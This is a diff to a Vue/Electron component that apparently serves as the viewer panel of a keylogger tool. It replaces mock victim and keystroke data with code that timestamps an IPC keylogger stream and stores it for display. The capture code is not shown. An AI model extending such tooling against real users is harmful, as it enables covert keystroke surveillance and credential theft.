@@ -29,10 +29,10 @@
   <div id="text"
   @dblclick="refreshKeylogger">
     <ul>
-      <template v-for="keylog in keylogs">
-        <li style="color: cornflowerblue">{{keylog.program}}</li>
+      <template v-for="keylog in $store.state.keyloggerList">
+        <li style="color: cornflowerblue">{{keylog.time}}</li>
         <li style="color: #8d98a2">=======</li>
-        <li style="color: white">{{keylog.key}}</li>
+        <li style="color: white">{{keylog.input}}</li>
         <li><br></li>
       </template>
     </ul>
@@ -47,39 +47,7 @@ export default {
 
   data () {
     return {
-      tableData: [
-        {
-          User: 'pyfsg',
-          computer: 'WIN-J7LSRN82JKR',
-          pid: '2912',
-          when: '2020-13-32'
-        },
-        {
-          User: 'pyfsg',
-          computer: 'WIN-J7LSRN82JKR',
-          pid: '2912',
-          when: '2020-13-32'
-        },
-        {
-          User: 'pyfsg',
-          computer: 'WIN-J7LSRN82JKR',
-          pid: '2912',
-          when: '2020-13-32'
-        }
-      ],
-      keylogs: [
-        {
-          program: '新建文本文档 - 记事本',
-          key: 'ASDDSFGWEQRSDFdsafwerqwe'
-        },
-        {
-          program: 'System',
-          key: 'A2143453243122412213e'
-        }, {
-          program: 'Microsoft Edge',
-          key: '123532assdfsdfsdfsdfasads'
-        }
-      ]
+
     }
   },
   methods: {
@@ -105,7 +73,13 @@ export default {
      */
     updateKeylogger () {
       ipcRenderer.once('KeyloggerUpdate', (event, stream) => {
-        alert('Vue:' + stream)
+        let date = new Date()
+        let newdate = date.toLocaleString('chinese', { hour12: false })
+        let set = {
+          input : stream,
+          time : newdate
+        }
+        this.$store.commit('updateKeyloggerList', set)
       })
       ipcRenderer.send('requestKeylogger', 'update')
     },
